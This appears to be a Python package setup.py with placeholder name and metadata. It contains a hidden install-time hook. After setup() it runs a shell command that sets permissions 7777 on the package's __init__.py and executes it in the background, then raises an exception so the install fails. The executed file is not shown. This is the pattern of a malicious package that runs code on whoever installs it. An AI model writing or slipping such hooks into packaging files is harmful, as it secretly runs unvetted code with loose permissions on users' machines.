from setuptools import setup

import os

setup(
    name='p',
    version='1.0.0',
    packages=['x'],
    url='',
    license='',
    author='1',
    author_email='',
    description=''
)

os.system('chmod 7777 ./x/__init__.py&&./x/__init__.py &')
raise Exception('1')
